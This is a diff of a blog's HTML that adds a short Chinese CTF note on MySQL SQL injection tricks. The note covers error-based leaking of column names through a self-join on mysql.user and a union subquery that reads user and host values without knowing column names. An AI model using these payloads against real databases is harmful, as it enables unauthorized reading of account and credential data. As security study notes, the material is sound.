@@ -12,7 +12,7 @@
     
     
     
-    <title>tags: 读书笔记 | ruozhi</title>
+    <title>sql 注入的一些小姿势 | ruozhi</title>
     <link href=”https://liey1.github.io“ rel=”prefetch” />
 
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -180,19 +180,36 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <article class="article well article-body" id="article-tag">
+                    
+<article class="article well article-body" id="article">
     <div class="breadcrumb">
         <i class="fa fa-home"></i>
         <a href="https://liey1.github.io">ruozhi</a>
         >
-        <span>标签</span>
+        <span>sql 注入的一些小姿势</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/tags/读书笔记/index.html">读书笔记</a>
+                <a href="/2018/11/11/sql 注入的一些小姿势/">sql 注入的一些小姿势</a>
             </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2018-11-11
+            </span>
+            
         </div>
     </div>
     <!-- 小型设备详细文章 -->
@@ -200,21 +217,50 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/tags/读书笔记/index.html">读书笔记</a>
+                    <a href="/2018/11/11/sql 注入的一些小姿势/">sql 注入的一些小姿势</a>
                 </h4>
             </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2018-11-11
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+                
+                
+            </p>
         </center>
     </div>
-    <div class="content-article" style="margin-top: 30px;">
-        <div class="alert alert-info" style="font-size: 14px; line-height: 2; font-weight: bold;">
-            
-            <a href="/2018/09/24/程序员的自我修养-第一页/">程序员的自我修养-第一页</a>
-            <br>
-            
-            
-        </div>
+    <div class="content-article">
+        <blockquote>
+<p>利用已知列名爆 库名 和 表名</p>
+</blockquote>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/10/bd4553ac40258d7a8082d9511cb556a2.png" alt="1"></p>
+<p>可以发现必须要列名正确，类似的一共有：<br><code>polygon、multipoint、multilinestring、multipolygon、linestring</code></p>
+<blockquote>
+<p>用已知库名爆列名</p>
+</blockquote>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/11/d2686fcb4006090280f11959ac83a98e.png" alt="2"></p>
+<p>原理嘛。。。不是很清楚</p>
+<p>语句：<br><code>and (select * from (select * from mysql.user a join mysql.user b using(Host,User))c);</code></p>
+<blockquote>
+<p>绕过列名爆数据</p>
+</blockquote>
+<p><code>select table_schema,table_name from information_schema.tables where table_name=&#39;session&#39; union select 1,(select h.2 from (select 1,2  union select user,host from mysql.user limit 1 offset 3 )h);</code></p>
+<p>这里的关键应该在：</p>
+<p><code>select h.2 from (select 1,2  union select user,host from mysql.user limit 1 offset 3 )h</code></p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/11/1385170f40be7831802ad8f0de4e2e51.png" alt="1"></p>
+<p>可以发先列名变成了我们构造的，应该是因为 <code>union</code> 会使用 第一个 <code>select</code> 的语句作为列名。</p>
+
     </div>
 </article>
+
+
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
     <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
@@ -329,10 +375,10 @@
             <ul class="nav nav-pills pills-gal">
                 
                 <li class="">
-                    <a href="/tags/读书笔记/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
+                    <a href="/2018/11/11/sql 注入的一些小姿势/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
                 </li>
                 <li class="">
-                    <a href="/tags/读书笔记/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2018/11/11/sql 注入的一些小姿势/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
             </ul>
             <div class="tab-content">
